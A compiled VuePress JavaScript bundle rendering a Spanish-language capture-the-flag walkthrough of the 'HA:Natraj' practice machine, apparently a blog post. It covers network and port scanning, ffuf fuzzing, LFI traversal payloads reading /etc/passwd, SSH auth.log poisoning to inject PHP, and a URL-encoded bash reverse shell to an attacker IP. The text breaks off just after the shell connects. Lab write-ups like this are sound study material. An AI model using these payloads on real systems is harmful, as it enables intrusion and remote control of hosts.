(window["webpackJsonp"] = window["webpackJsonp"] || []).push([[11],{

/***/ 314:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/infoprevia.7fb589bb.png";

/***/ }),

/***/ 315:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/websitepreview.b44c5f5d.png";

/***/ }),

/***/ 316:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/apartadoconsole.863cd43a.png";

/***/ }),

/***/ 317:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/firstFLIssh.f0276fb2.png";

/***/ }),

/***/ 318:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/sshlogonkali.1a1d0cbb.png";

/***/ }),

/***/ 319:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/sshlogonWSL.07e73e6d.png";

/***/ }),

/***/ 320:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/logpoissonigtest.73d9ec1d.png";

/***/ }),

/***/ 321:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/reverseshell.98746a71.png";

/***/ }),

/***/ 322:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/sttysize.3a2311ec.png";

/***/ }),

/***/ 323:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/maquinavictima.cb82067a.png";

/***/ }),

/***/ 324:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/userpivoting.4254bb81.png";

/***/ }),

/***/ 325:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/secondreverseshell.b7747beb.png";

/***/ }),

/***/ 326:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/permision.413796fd.png";

/***/ }),

/***/ 327:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/privilegiescalation.bcd3d18e.png";

/***/ }),

/***/ 328:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/flagroot.0a82779f.png";

/***/ }),

/***/ 329:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__.p + "assets/img/final.f4fee090.png";

/***/ }),

/***/ 340:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// CONCATENATED MODULE: ./node_modules/cache-loader/dist/cjs.js?{"cacheDirectory":"node_modules/@vuepress/core/node_modules/.cache/vuepress","cacheIdentifier":"29b89134-vue-loader-template"}!./node_modules/cache-loader/dist/cjs.js??ref--3-0!./node_modules/babel-loader/lib??ref--3-1!./node_modules/vue-loader/lib/loaders/templateLoader.js??ref--6!./node_modules/cache-loader/dist/cjs.js??ref--1-0!./node_modules/vue-loader/lib??ref--1-1!./node_modules/@vuepress/markdown-loader??ref--1-2!./blog/_posts/2024_13_05_guide/Natraj.md?vue&type=template&id=3f270615
var render = function render() {
  var _vm = this,
    _c = _vm._self._c;
  return _c('ContentSlotsDistributor', {
    attrs: {
      "slot-key": _vm.$parent.slotKey
    }
  }, [_c('h2', {
    attrs: {
      "id": "investigacion-previa-a-la-prueba-de-penetracion"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#investigacion-previa-a-la-prueba-de-penetracion"
    }
  }, [_vm._v("#")]), _vm._v(" Investigación previa a la prueba de penetración")]), _vm._v(" "), _c('blockquote', [_c('p', [_vm._v("Es importante conocer en qué software de virtualización fue creada la maquina a atacar debido a que puede presentar incompatibilidad, en mi caso fue necesario utilizar VMware ya que con VirtualBox no podía conectarse a la red.\nEl propio creador de la maquina sugiere usar este software de virtualización.\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(314),
      "alt": "Informacion previa"
    }
  })])]), _vm._v(" "), _c('h2', {
    attrs: {
      "id": "reconocimiento"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#reconocimiento"
    }
  }, [_vm._v("#")]), _vm._v(" Reconocimiento")]), _vm._v(" "), _c('h3', {
    attrs: {
      "id": "descubriendo-dispositivos-dentro-de-la-red"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#descubriendo-dispositivos-dentro-de-la-red"
    }
  }, [_vm._v("#")]), _vm._v(" descubriendo dispositivos dentro de la red")]), _vm._v(" "), _c('p', [_vm._v("En esta maquina, no conocemos su IP de primera por lo que es necesario hacer un escaneo de red para conocer los dispositivos conectados a la red mediante uno de los siguientes comandos\n"), _c('strong', [_vm._v("1.- Con nmap")])]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("sudo")]), _vm._v(" nmap "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-sP")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token number"
    }
  }, [_vm._v("192.168")]), _vm._v(".0.1/24\n")])])]), _c('p', [_c('strong', [_vm._v("2.- con netdiscover")])]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("sudo")]), _vm._v(" netdiscover\n")])])]), _c('p', [_c('strong', [_vm._v("3.- con arp-scan")])]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("sudo")]), _vm._v(" arp-scan "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("--interface")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v("=")]), _vm._v("eth0 "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("--localnet")]), _vm._v("\n")])])]), _c('p', [_vm._v("en cualquiera de los 3 casos podemos identificar la IP de la maquina victima debido a que tiene una dirección MAC de VMware o porque comparte la dirección MAC de la maquina anfitrión o maquina física (en mi caso un Windows 11)")]), _vm._v(" "), _c('div', {
    staticClass: "language-ini extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-ini"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token key attr-name"
    }
  }, [_vm._v("❯ sudo arp-scan --interface")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("=")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token value attr-value"
    }
  }, [_vm._v("eth0 --localnet")]), _vm._v("\nInterface: eth0, type: EN10MB, MAC: 08:00:27:93:dd:7b, IPv4: 192.168.0.18\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.0.1\t   XX:XX:XX:XX:XX:XX\tCloud Network Technology (Samoa) Limited\n192.168.0.3\t   XX:XX:XX:f3:d8:88\tIntel Corporate\n192.168.0.4\t   XX:XX:XX:XX:XX:XX\tQingdao Hisense Communications Co.,Ltd.\n192.168.0.5\t   XX:XX:XX:XX:XX:XX\t(Unknown: locally administered)\n192.168.0.21   XX:XX:XX:f3:d8:88\tIntel Corporate\n192.168.0.20   XX:XX:XX:XX:XX:XX\t(Unknown: locally administered)\n")])])]), _c('h3', {
    attrs: {
      "id": "descubrimiento-de-puertos-abiertos"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#descubrimiento-de-puertos-abiertos"
    }
  }, [_vm._v("#")]), _vm._v(" descubrimiento de puertos abiertos")]), _vm._v(" "), _c('p', [_vm._v("Una vez identificada la dirección IP de la maquina victima, procedemos a hacer el primer escaneo para reconocer sus puertos abiertos:")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("sudo")]), _vm._v(" nmap -p- "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("--open")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-sS")]), _vm._v(" --min-rate "), _c('span', {
    pre: true,
    attrs: {
      "class": "token number"
    }
  }, [_vm._v("5000")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-vvv")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-n")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-Pn")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token number"
    }
  }, [_vm._v("192.168")]), _vm._v(".0.21 "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-oN")]), _vm._v(" escaneo\n")])])]), _c('blockquote', [_c('p', [_vm._v("Al usar -vvv nos reporta por consola los puertos abiertos durante el escaneo, por lo que sabiendo que servicios corren en esos puertos por defecto es posible adelantar algo de trabajo antes de que termine el escaneo")])]), _vm._v(" "), _c('p', [_vm._v("teniendo el siguiente resultado:")]), _vm._v(" "), _c('div', {
    staticClass: "language-ini extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-ini"
    }
  }, [_c('code', [_vm._v("PORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\nMAC Address: F0:9E:4A:F3:D8:88 (Intel Corporate)\n")])])]), _c('h3', {
    attrs: {
      "id": "analizano-los-puertos-abiertos"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#analizano-los-puertos-abiertos"
    }
  }, [_vm._v("#")]), _vm._v(" analizano los puertos abiertos")]), _vm._v(" "), _c('p', [_vm._v("Es posible que requiramos un segundo escaneo para reconocer los servicios y la versión de estos que corren por los puertos abiertos")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_vm._v("nmap -p22,80 "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-sCV")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token number"
    }
  }, [_vm._v("192.168")]), _vm._v(".0.21 "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-oN")]), _vm._v(" puertos\n")])])]), _c('p', [_vm._v("Tenemos el siguiente resultado:")]), _vm._v(" "), _c('div', {
    staticClass: "language-ini extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-ini"
    }
  }, [_c('code', [_vm._v("PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)\n|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)\n|_  256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: HA:Natraj\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n")])])]), _c('p', [_vm._v("identificamos que por el puerto 80 está corriendo un servicio HTTP por lo que podemos intuir que el servidor alberga un sitio web:\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(315),
      "alt": "Primeravista del sitio web"
    }
  })]), _vm._v(" "), _c('h3', {
    attrs: {
      "id": "enumeracion"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#enumeracion"
    }
  }, [_vm._v("#")]), _vm._v(" Enumeración")]), _vm._v(" "), _c('p', [_vm._v("analizando el código fuente y demás parte del sitio, vemos que no hay nada interesante por lo que procedemos a hacer una enumeración de los directorios y archivos que se encuentran en el sitio web mediante "), _c('code', [_vm._v("ffuf")])]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_vm._v("ffuf "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-c")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-w")]), _vm._v(" /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-u")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token string"
    }
  }, [_vm._v("\"http://192.168.0.21/FUZZ\"")]), _vm._v("\n")])])]), _c('p', [_vm._v("descubrimos que tenemos acceso a los siguientes directorios:")]), _vm._v(" "), _c('div', {
    staticClass: "language- extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-text"
    }
  }, [_c('code', [_vm._v("\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.0.21/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\n[---- mucho texto ---]\nimages                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1518ms]\nconsole                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 148ms]\n                        [Status: 200, Size: 14497, Words: 1956, Lines: 183, Duration: 207ms]\nserver-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 15ms]\n:: Progress: [220560/220560] :: Job [1/1] :: 1117 req/sec :: Duration: [0:03:15] :: Errors: 0 ::\n\n")])])]), _c('p', [_vm._v("dentro del directorio console vemos que hay un archivo php el cual a primera vista parece que no tiene nada:\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(316),
      "alt": "Apartado console"
    }
  })]), _vm._v(" "), _c('p', [_vm._v("Por lo que se procede a volver a enumerar con "), _c('code', [_vm._v("ffuf")]), _vm._v(" para encontrar parámetros validos del sitio web")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_vm._v("ffuf "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-c")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-w")]), _vm._v(" /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-u")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token string"
    }
  }, [_vm._v("\"http://192.168.0.21/console/file.php?FUZZ=../images/5.jpg\"")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v("|")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("grep")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-v")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token string"
    }
  }, [_vm._v("\"Words: 1\"")]), _vm._v("\n")])])]), _c('p', [_vm._v("Para conocer el parámetro, es necesario enfocarse en el valor de un archivo que se encuientre dentro del servidor, en este caso me apoye de una de las imagenes del sitio web y obtuve el siguiente resultado:")]), _vm._v(" "), _c('div', {
    staticClass: "language- extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-text"
    }
  }, [_c('code', [_vm._v("        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.0.21/console/file.php?FUZZ=../images/5.jpg\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\nfile                    [Status: 200, Size: 74239, Words: 259, Lines: 313, Duration: 50ms]\n:: Progress: [220560/220560] :: Job [1/1] :: 813 req/sec :: Duration: [0:05:36] :: Errors: 0 ::\n")])])]), _c('blockquote', [_c('p', [_vm._v("También usé "), _c('code', [_vm._v("grep")]), _vm._v(" para tener una mejor precisión en la búsqueda ya que de primera pareciera que todos los parámetros son validos")])]), _vm._v(" "), _c('h2', {
    attrs: {
      "id": "analisis-de-vulneravilidades"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#analisis-de-vulneravilidades"
    }
  }, [_vm._v("#")]), _vm._v(" Analisis de vulneravilidades")]), _vm._v(" "), _c('p', [_vm._v("Ahora haremos un tercer escaneo para enumerar los archivos que se encuentran en el servidor, ya que pareciera que es vulnerable a LFI\nUtilizaremos la misma herramienta para enumerar pero ahora con otro diccionario")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_vm._v("ffuf "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-c")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-w")]), _vm._v(" /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-u")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token string"
    }
  }, [_vm._v("\"http://192.168.0.21/console/file.php?file=FUZZ\"")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v("|")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("grep")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-v")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token string"
    }
  }, [_vm._v("\"Words: 1\"")]), _vm._v("\n")])])]), _c('h2', {
    attrs: {
      "id": "explotacion"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#explotacion"
    }
  }, [_vm._v("#")]), _vm._v(" Explotación")]), _vm._v(" "), _c('p', [_vm._v("En efecto, es vulnerable a LFI")]), _vm._v(" "), _c('div', {
    staticClass: "language- extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-text"
    }
  }, [_c('code', [_vm._v("        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.0.23/console/file.php?file=FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\n/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 270ms]\n/etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 52ms]\n/etc/apt/sources.list   [Status: 200, Size: 3018, Words: 310, Lines: 56, Duration: 55ms]\n..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 354ms]\n/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 35ms]\n/etc/issue              [Status: 200, Size: 24, Words: 5, Lines: 3, Duration: 2ms]\n/etc/passwd             [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 3ms]\n/../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 8ms]\n/./././././././././././etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 9ms]\n../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 10ms]\n../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 5ms]\n../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 51ms]\n../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 45ms]\n../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 2ms]\n../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 58ms]\n../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 43ms]\n../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 6ms]\n../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 66ms]\n../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 3ms]\n../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 2ms]\n../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 8ms]\n../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 5ms]\n../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 66ms]\n../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 6ms]\n../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 12ms]\n../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 122ms]\n../../../../etc/passwd  [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 156ms]\n../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 81ms]\n../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 411ms]\n/etc/ssh/sshd_config    [Status: 200, Size: 3264, Words: 294, Lines: 123, Duration: 7ms]\n/etc/updatedb.conf      [Status: 200, Size: 403, Words: 42, Lines: 5, Duration: 17ms]\n/etc/resolv.conf        [Status: 200, Size: 701, Words: 96, Lines: 18, Duration: 109ms]\n/etc/rpc                [Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 110ms]\n/proc/meminfo           [Status: 200, Size: 1335, Words: 489, Lines: 49, Duration: 3ms]\n/proc/loadavg           [Status: 200, Size: 25, Words: 5, Lines: 2, Duration: 4ms]\n/proc/self/status       [Status: 200, Size: 1291, Words: 92, Lines: 54, Duration: 2ms]\n/proc/net/route         [Status: 200, Size: 512, Words: 287, Lines: 5, Duration: 12ms]\n/proc/partitions        [Status: 200, Size: 116, Words: 51, Lines: 6, Duration: 15ms]\n/proc/net/dev           [Status: 200, Size: 446, Words: 254, Lines: 5, Duration: 17ms]\n..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 1074ms]\n/var/log/auth.log       [Status: 200, Size: 19619, Words: 2358, Lines: 207, Duration: 34ms]\n///////../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 48ms]\n:: Progress: [922/922] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:05] :: Errors: 0 ::\n")])])]), _c('p', [_vm._v("Vemos que tenemos acceso a lectura de los registros de inicio de sesión del servicio SSH\npor lo que es posible escribirlo tratando de iniciar sesión")]), _vm._v(" "), _c('p', [_c('img', {
    attrs: {
      "src": __webpack_require__(317),
      "alt": "test de LFI con archivo auth"
    }
  })]), _vm._v(" "), _c('p', [_vm._v("Y lo más importante, inyectar codigo PHP")]), _vm._v(" "), _c('blockquote', [_c('p', [_vm._v("Nota importante: es posible que no puedas inyectar codigo PHP ya que no puedes ingresar caracteres especiales para iniciar sesión al servicio ssh\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(318),
      "alt": "Log con kali"
    }
  }), _vm._v("\nEn mi caso tengo este error en Kali GNU/Linux, por lo que tuve que usar otros dispositivos\ncomo en este caso Ubuntu corriendo en WSL:\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(319),
      "alt": "Log con Ubuntu en WSL"
    }
  })])]), _vm._v(" "), _c('p', [_vm._v("Usando el usuario para inyectar código PHP tenemos los siguientes resultados visibles en el sitio web:\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(320),
      "alt": "test de log poissonig"
    }
  })]), _vm._v(" "), _c('p', [_vm._v("Se logró un logpoissonig del archivo auth.log ejecutando el comando \"id\", ahora desde un web shell, entablamos una conexión a la maquina atacante mediante una reverse shell codificado a URL de la siguiente manera:")]), _vm._v(" "), _c('div', {
    staticClass: "language-ini extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-ini"
    }
  }, [_c('code', [_vm._v("bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.24%2f443%200%3E%261%22\n")])])]), _c('p', [_vm._v("nos ponemos en escucha con el siguiente comando:")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("nc")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-nlvp")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("[")]), _vm._v("Puerto Atacante"), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("]")]), _vm._v("\n")])])]), _c('p', [_vm._v("y ejecutamos el comando bash en el navegador\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(321),
      "alt": "Reverse shell"
    }
  })]), _vm._v(" "), _c('p', [_vm._v("vemos que se queda trabado y no responde, lo que significa que hemos entablado conexión con la maquina victima")]), _vm._v(" "), _c('div', {
    staticClass: "language- extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-text"
    }
